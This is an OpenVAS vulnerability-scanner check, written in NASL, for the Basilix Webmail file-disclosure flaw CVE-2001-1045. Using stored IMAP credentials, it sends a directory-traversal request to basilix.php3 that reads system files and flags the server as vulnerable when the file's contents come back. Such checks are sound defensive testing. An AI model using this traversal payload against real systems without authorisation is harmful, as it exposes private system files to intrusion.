###############################################################################
# OpenVAS Vulnerability Test
# $Id: basilix_webmail.nasl 13407 2019-02-01 12:38:22Z cfischer $
#
# Basilix Webmail Dummy Request Vulnerability
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:basilix:basilix_webmail";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11072");
  script_version("$Revision: 13407 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-01 13:38:22 +0100 (Fri, 01 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(2995);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2001-1045");
  script_name("Basilix Webmail Dummy Request Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("Web application abuses");
  script_dependencies("basilix_detect.nasl", "logins.nasl", "os_detection.nasl");
  script_mandatory_keys("basilix/installed", "imap/login", "imap/password");

  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2001-07/0114.html");

  script_tag(name:"solution", value:"Update Basilix or remove DUMMY from lang.inc.");

  script_tag(name:"summary", value:"The script 'basilix.php3' is installed on the remote web server
  which is prone to information disclosure.");

  script_tag(name:"impact", value:"This flaw allow the users to read any file on
  the system with the permission of the webmail software, and execute any PHP.");

  script_tag(name:"solution_type", value:"Workaround");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("imap_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

kb_creds = imap_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
if( ! user || ! pass )
  exit( 0 );

files = traversal_files();
foreach file( keys( files ) ) {

  url = "/basilix.php3?request_id[DUMMY]=../../../../../../../../../" + files[file]  + "&RequestID=DUMMY&username=" + user + "&password=" + pass;
  if( http_vuln_check( port:port, url:url, pattern:file  ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );